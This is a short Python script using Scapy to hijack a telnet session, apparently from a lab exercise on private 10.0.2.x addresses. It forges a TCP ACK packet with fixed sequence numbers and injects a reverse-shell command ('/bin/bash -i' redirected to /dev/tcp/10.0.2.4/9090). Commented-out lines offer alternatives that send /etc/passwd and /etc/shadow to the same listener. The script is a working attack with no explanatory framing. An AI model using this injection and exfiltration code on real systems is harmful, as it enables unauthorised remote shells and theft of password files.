#!/usr/bin/python3

import sys

from scapy.all import *

iph=IP(src="10.0.2.6",dst="10.0.2.5")

tcph=TCP(sport=46940,dport=23, flags="A",seq=2175603151,ack=4223632293)

Data="\r /bin/bash -i  >/dev/tcp/10.0.2.4/9090    2>&1    0<&1 \r"
#Data="\r cat /etc/passwd  >/dev/tcp/10.0.2.4/9090 \r"
#Data="\r sudo cat /etc/shadow  >/dev/tcp/10.0.2.4/9090 \r"

pkt=iph/tcph/Data

ls(pkt)

send(pkt)







